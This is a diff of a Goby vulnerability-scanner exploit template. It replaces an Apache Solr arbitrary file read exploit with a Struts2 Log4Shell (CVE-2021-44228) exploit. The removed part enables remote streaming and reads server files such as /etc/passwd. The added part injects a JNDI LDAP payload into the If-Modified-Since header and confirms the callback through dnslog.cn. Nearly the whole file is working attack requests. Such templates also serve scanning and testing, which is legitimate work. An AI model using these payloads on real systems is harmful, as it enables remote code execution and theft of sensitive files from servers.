@@ -1,40 +1,98 @@
 {
-      "Name": "Apache Solr Arbitrary File Read",
-      "Level": "2",
-      "Tags": ["fileread"],
-      "GobyQuery": "app=\"Solr\"",
-      "Description": "Apache Solr has an arbitrary file read vulnerability, which allows attackers to obtain sensitive files from the target server without authorization.",
-      "Product": "Apache Solr",
-      "Homepage": "https://solr.apache.org/",
-      "Author": "PeiQi",
-      "Impact": "<p>Read any file on the server</p>",
-      "Recommandation": "<p>undefined</p>",
-      "References": [
-            "http://wiki.peiqi.tech"
+      "Name": "Struts2 Log4Shell CVE-2021-44228 (2)",
+      "Level": "3",
+      "Tags": [
+            "rce"
       ],
-	  "HasExp": true,
-	  "ExpParams": [
-		{
-			"name": "file",
-			"type": "createSelect",
-			"value": "/etc/passwd,\\\\127.0.0.1\\c$\\Windows\\win.ini",
-			"show": ""
-			}
-	  ],
-	  "ExpTips": {
-		"Type": "",
-		"Content": ""
-	  },
+      "GobyQuery": "app=\"Struts2\"",
+      "Description": "Struts2某些文件会记录If-Modified-Since信息，其存在log4j漏洞。",
+      "Product": "Struts2",
+      "Homepage": "https://struts.apache.org/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "cmd",
+                  "Type": "input",
+                  "Value": "${jndi:ldap://xxxxdnslog.cn/tes}"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
       "ScanSteps": [
             "AND",
             {
                   "Request": {
                         "method": "GET",
-                        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
-                        "follow_redirect": true,
-                        "header": {},
+                        "uri": "http://www.dnslog.cn/getdomain.php",
+                        "follow_redirect": false,
+                        "header": null,
                         "data_type": "text",
-                        "data": ""
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "dnstest|lastbody||"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/struts2-showcase/struts/utils.js",
+                        "follow_redirect": false,
+                        "header": {
+                              "If-Modified-Since": "${jndi:ldap://{{{dnstest}}}/tes}"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "http://www.dnslog.cn/getrecords.php",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -51,86 +109,29 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "responseHeader",
+                                    "value": "{{{dnstest}}}",
                                     "bz": ""
                               }
                         ]
                   },
-                  "SetVariable": []
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
             }
       ],
-	  "ExploitSteps": [
+      "ExploitSteps": [
             "AND",
             {
                   "Request": {
                         "method": "GET",
-                        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
-                        "follow_redirect": false,
-                        "header": {},
-                        "data_type": "text",
-                        "data": ""
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              },
-                              {
-                                    "type": "item",
-                                    "variable": "$body",
-                                    "operation": "contains",
-                                    "value": "responseHeader",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": [
-                        "output|lastbody|regex|(?s)\"name\":\"(.*?)\","
-                  ]
-            },
-            {
-                  "Request": {
-                        "method": "POST",
-                        "set_variable":["solrCore|lastbody|regex|(?s)\"name\":\"(.*?)\","],
-                        "uri": "/solr/{{{solrCore}}}/config",
+                        "uri": "/struts2-showcase/struts/utils.js",
                         "follow_redirect": false,
                         "header": {
-                              "Content-Type": "application/json"
+                              "If-Modified-Since": "${jndi:ldap://{{{cmd}}}/tes}"
                         },
                         "data_type": "text",
-                        "data": "{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": []
-            },
-            {
-                  "Request": {
-                        "method": "POST",
-                        "uri": "/solr/{{{solrCore}}}/debug/dump?param=ContentStreams",
-                        "follow_redirect": false,
-                        "header": {
-                              "Content-Type": "application/x-www-form-urlencoded"
-                        },
-                        "data_type": "text",
-                        "data": "stream.url=file://{{{file}}}"
+                        "data": "",
+                        "set_variable": []
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -146,10 +147,10 @@
                         ]
                   },
                   "SetVariable": [
-                  "output|lastbody|regex|(?s)\"stream\":\"(.*)\"}]"
+                        "output|lastbody|regex|"
                   ]
             }
       ],
-      "PostTime": "2021-03-27 17:17:15",
-      "GobyVersion": "1.8.254"
+      "PostTime": "2021-12-23 15:43:11",
+      "GobyVersion": "1.9.310"
 }
